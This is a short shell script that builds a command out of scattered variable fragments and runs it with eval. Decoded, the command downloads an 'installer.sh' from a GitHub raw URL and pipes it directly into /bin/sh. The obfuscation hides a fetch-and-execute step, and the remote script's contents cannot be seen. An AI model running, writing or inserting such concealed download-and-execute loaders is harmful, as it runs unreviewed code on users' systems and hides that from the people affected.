z="
";Kz='mil2';Cz='ps:/';Fz='hubu';Qz='n/in';Hz='onte';Mz='hann';Jz='om/e';Nz='el-r';Xz='sh';Iz='nt.c';Dz='/raw';Pz='/mai';Rz='stal';Bz=' htt';Lz='37/c';Sz='ler.';Uz='qO -';Tz='sh -';Wz='bin/';Oz='omeh';Az='wget';Ez='.git';Vz=' | /';Gz='serc';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"